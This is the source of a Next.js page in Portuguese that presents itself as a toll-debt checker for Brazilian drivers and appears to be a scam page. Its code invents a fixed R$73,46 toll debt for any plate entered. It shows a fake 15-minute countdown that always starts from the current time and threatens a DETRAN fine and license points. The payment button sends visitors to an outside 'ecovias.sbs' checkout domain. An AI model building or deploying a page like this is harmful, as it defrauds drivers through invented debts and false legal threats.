"use client"

import { useSearchParams, useRouter } from "next/navigation"
import { Card } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Checkbox } from "@/components/ui/checkbox"
import { ChevronLeft, Car, ChevronDown, AlertTriangle } from "lucide-react"
import { useState, useEffect } from "react"

interface DebitItem {
  id: number
  placa: string
  data: string
  empresa: string
  localizacao: string
  valor: string
}

interface VehicleData {
  placa: string
  marca: string
  modelo: string
  marcaModelo: string
  cor: string
  ano: string
  uf: string
  municipio: string
}

export default function DebitosPage() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const placa = searchParams.get("placa") || ""
  const [vehicleData] = useState<VehicleData | null>(null)
  const [currentTime, setCurrentTime] = useState("")
  const [currentDate, setCurrentDate] = useState("")
  const [showModal, setShowModal] = useState(true)
  const [deadlineTime, setDeadlineTime] = useState("")
  const [deadlineDay, setDeadlineDay] = useState("")

  useEffect(() => {
    const updateTime = () => {
      const now = new Date()
      const formatted = now.toLocaleString("pt-BR", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
        hour: "2-digit",
        minute: "2-digit",
      })
      setCurrentTime(formatted)

      const dateFormatted = now.toLocaleDateString("pt-BR", {
        day: "2-digit",
        month: "2-digit",
        year: "numeric",
      })
      setCurrentDate(dateFormatted)

      // Calculate deadline (current time + 15 minutes)
      const deadline = new Date(now.getTime() + 15 * 60 * 1000)
      const deadlineTimeFormatted = deadline.toLocaleTimeString("pt-BR", {
        hour: "2-digit",
        minute: "2-digit",
      })
      setDeadlineTime(deadlineTimeFormatted)

      const deadlineDayName = deadline.toLocaleDateString("pt-BR", {
        weekday: "long",
      })
      const capitalizedDay = deadlineDayName.charAt(0).toUpperCase() + deadlineDayName.slice(1)
      setDeadlineDay(capitalizedDay)
    }

    updateTime()
    const interval = setInterval(updateTime, 1000)

    return () => clearInterval(interval)
  }, [])

  const debitItems: DebitItem[] = [
    {
      id: 1,
      placa: placa,
      data: currentDate,
      empresa: `Tarifas de Pedágio do Veículo ${placa}`,
      localizacao: "Vala, Manduri, Vala, São Paulo",
      valor: "73,46",
    },
  ]

  const totalValue = "73,46"

  const handleContinue = () => {
    window.location.href = "https://checkout.ecovias.sbs/VCCL1O8SCIKV"
  }

  return (
    <div className="min-h-screen bg-gray-100 pb-24">
      {/* Header */}
      <header className="bg-white border-b border-gray-200 sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4 flex items-center gap-4">
          <button
            onClick={() => router.push("/")}
            className="p-2 -ml-2 hover:bg-gray-100 rounded-lg transition-colors"
            aria-label="Voltar"
          >
            <ChevronLeft className="w-6 h-6 text-gray-900" />
          </button>
          <h1 className="text-xl font-bold text-gray-900">Débitos</h1>
        </div>
      </header>

      {/* Banner with Vehicle Info */}
      <section className="relative mb-6">
        <div className="relative h-48 overflow-hidden">
          <img
            src="https://www.pedagiodigital.com/assets/home-KlC6Y-6S.png"
            alt="Banner"
            className="w-full h-full object-cover"
          />
        </div>

        {/* Vehicle Card Overlay */}
        <div className="px-4 -mt-16 relative z-10">
          <Card className="bg-white border-0 shadow-lg p-4">
            <div className="flex items-center justify-between gap-2 mb-3 flex-wrap">
              <div className="flex items-center gap-2">
                <Car className="w-5 h-5 text-gray-600" />
                <span className="text-sm text-gray-600 font-medium">Seus veículos:</span>
              </div>
              <div className="text-xs text-gray-500">
                Atualizado em: <span className="font-medium">{currentTime}</span>
              </div>
            </div>
            <div className="bg-white border border-gray-300 rounded-lg p-3">
              <div className="flex items-center justify-between mb-2">
                <p className="text-lg font-semibold text-gray-900 tracking-wide select-none">{placa}</p>
                <button className="text-gray-400 hover:text-gray-600">
                  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <circle cx="11" cy="11" r="8" />
                    <path d="m21 21-4.35-4.35" />
                  </svg>
                </button>
              </div>
              {vehicleData && (
                <div className="border-t border-gray-200 pt-2 mt-2 space-y-1">
                  {vehicleData.marcaModelo && (
                    <p className="text-sm text-gray-600"><span className="font-medium">Veículo:</span> {vehicleData.marcaModelo}</p>
                  )}
                  {vehicleData.cor && (
                    <p className="text-sm text-gray-600"><span className="font-medium">Cor:</span> {vehicleData.cor}</p>
                  )}
                  {vehicleData.ano && (
                    <p className="text-sm text-gray-600"><span className="font-medium">Ano:</span> {vehicleData.ano}</p>
                  )}
                </div>
              )}
            </div>
          </Card>
        </div>
      </section>

      {/* Debits Section */}
      <section className="px-4 pb-6">
        <div className="mb-4">
          <h2 className="text-xl font-bold text-gray-900">Débitos</h2>
        </div>

        <div className="space-y-4">
          {debitItems.map((item) => (
            <Card key={item.id} className="bg-white border-0 shadow-sm p-4">
              <div className="flex items-start gap-3">
                <Checkbox checked={true} disabled className="w-5 h-5 mt-1 flex-shrink-0" />
                <div className="flex-1 min-w-0">
                  {/* Top row: number, plate, and date */}
                  <div className="flex items-start justify-between gap-3 mb-3">
                    <div className="flex items-center gap-2 flex-shrink-0">
                      <span className="text-base text-gray-900 select-none">{item.id}</span>
                      <span className="text-base font-bold text-gray-900 select-none">{item.placa}</span>
                    </div>
                    <div className="bg-black text-white text-xs font-medium px-3 py-1.5 rounded-full select-none whitespace-nowrap">
                      {item.data}
                    </div>
                  </div>

                  {/* Company name */}
                  <p className="text-base font-bold text-gray-900 mb-2 select-none">{item.empresa}</p>

                  <div className="flex items-center justify-between gap-3 mb-2">
                    <p className="text-sm text-gray-300 select-none blur-[3px]">Vala, Manduri, Vala, São Paulo</p>
                  </div>

                  {/* Price aligned to right */}
                  <div className="flex justify-end">
                    <p className="text-lg font-bold text-gray-900 select-none">R$ {item.valor}</p>
                  </div>
                </div>
              </div>
            </Card>
          ))}
        </div>
      </section>

      <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-lg z-50">
        <div className="px-4 py-4 flex items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            <p className="text-3xl font-bold text-gray-900 select-none">R$ {totalValue}</p>
            <ChevronDown className="w-5 h-5 text-gray-600" />
          </div>
          <Button
            size="lg"
            onClick={handleContinue}
            className="bg-black text-[#c8ff00] hover:bg-gray-900 font-semibold px-8 h-12 text-base rounded-lg"
          >
            Regularizar
          </Button>
        </div>
      </div>

      {/* Warning Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black/70 flex items-end sm:items-center justify-center z-[100] p-0 sm:p-4">
          <div className="bg-white rounded-t-2xl sm:rounded-3xl max-w-lg w-full max-h-[95vh] overflow-y-auto shadow-2xl animate-in slide-in-from-bottom-full sm:slide-in-from-bottom-0 duration-300">
            {/* Drag indicator */}
            <div className="flex justify-center pt-2 pb-1 sm:pt-4 sm:pb-2">
              <div className="w-12 h-1 bg-gray-300 rounded-full" />
            </div>

            <div className="px-5 py-5 sm:p-6 sm:pt-4">
              {/* Warning Header */}
              <div className="flex items-center justify-center gap-2 mb-5 sm:mb-4">
                <AlertTriangle className="w-6 h-6 sm:w-7 sm:h-7 text-red-600" />
                <h2 className="text-xl sm:text-2xl font-bold text-red-600">ATENÇÃO</h2>
              </div>

              {/* Main Message */}
              <div className="mb-6 sm:mb-5 text-center">
                <p className="text-base sm:text-lg font-bold text-gray-900 leading-relaxed mb-4">
                  Débitos em aberto encontrados{" "}
                  {vehicleData?.marcaModelo && (
                    <span className="text-sm text-gray-500 font-normal">({vehicleData.marcaModelo})</span>
                  )}
                </p>
                <p className="text-sm sm:text-base leading-relaxed text-gray-900 font-semibold">
                  <span className="text-red-600 font-bold">Hoje, {deadlineDay} às {deadlineTime}</span> - Caso não realize o pagamento, a multa será automaticamente encaminhada ao DETRAN. Após esse prazo de 15 minutos, caso você não realize o pagamento, o sistema emitirá automaticamente a multa de <span className="text-red-600 font-bold">R$ 195,23</span> e <span className="text-red-600 font-bold">5 pontos na CNH</span>.
                </p>
              </div>

              {/* CTB Article */}
              <div className="border-l-4 border-red-600 pl-4 sm:pl-4 pr-4 sm:pr-4 py-4 bg-red-50/50 rounded-r-lg mb-6 sm:mb-6">
                <h3 className="text-sm sm:text-base font-bold text-gray-900 mb-2">Art. 209-A - CTB:</h3>
                <p className="text-xs sm:text-sm text-gray-800 leading-relaxed mb-3">
                  Conforme o Art. 209-A do CTB: "Efetuar o pagamento de pedágio eletrônico fora do prazo estabelecido pelo órgão ou entidade de trânsito com circunscrição sobre a via."
                </p>
                <p className="text-xs sm:text-sm text-gray-800 mb-1">
                  <span className="font-semibold">Infração:</span> <span className="text-red-600 font-bold">Grave.</span>
                </p>
                <p className="text-xs sm:text-sm text-gray-800 mb-1">
                  <span className="font-semibold">Penalidade:</span> <span className="text-red-600 font-bold">Multa de R$ 195,23.</span>
                </p>
                <p className="text-xs sm:text-sm text-gray-800">
                  <span className="font-semibold">Pontuação:</span> <span className="text-red-600 font-bold">5 pontos na CNH.</span>
                </p>
              </div>

              {/* Button */}
              <Button
                size="lg"
                onClick={() => setShowModal(false)}
                className="w-full h-12 sm:h-14 text-sm sm:text-base font-bold bg-black text-[#c8ff00] hover:bg-gray-900 rounded-lg sm:rounded-xl"
              >
                CONTINUAR
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
